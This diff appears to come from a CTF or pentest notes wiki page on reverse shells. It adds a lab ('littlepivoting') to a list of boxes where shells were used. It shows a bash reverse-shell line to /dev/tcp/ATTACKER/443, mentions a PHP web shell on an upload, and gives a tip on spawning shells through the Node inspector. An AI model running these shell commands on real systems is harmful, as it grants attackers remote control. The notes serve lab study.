@@ -57,6 +57,6 @@ nohup bash -i >& /dev/tcp/ATTACKER/443 0>&1 &
 
 ## Seen in
 
-[[los-3-hackers]], [[baluhome]], [[ignite]], [[guided-pentest]], [[hannah-coffee]], [[balulero]], [[autoescuela]], [[grooti]], [[walkingcms]], [[anonymous-pingu]], [[trailpack]] (base64 `sh -i` via [[command-injection]]), [[bruteshock]] (nohup `bash -i` via [[shellshock]])
+[[los-3-hackers]], [[baluhome]], [[ignite]], [[guided-pentest]], [[hannah-coffee]], [[balulero]], [[autoescuela]], [[grooti]], [[walkingcms]], [[anonymous-pingu]], [[trailpack]] (base64 `sh -i` via [[command-injection]]), [[bruteshock]] (nohup `bash -i` via [[shellshock]]), [[littlepivoting]] (`/bin/bash -i >& /dev/tcp/…` over the pivot, pentestmonkey PHP shell on `upload`)
 
 > Node inspector tip ([[autoescuela]]): spawn the shell with async `exec()`/`spawn()`, not `execSync()` — the sync form blocks the event loop and freezes the app.
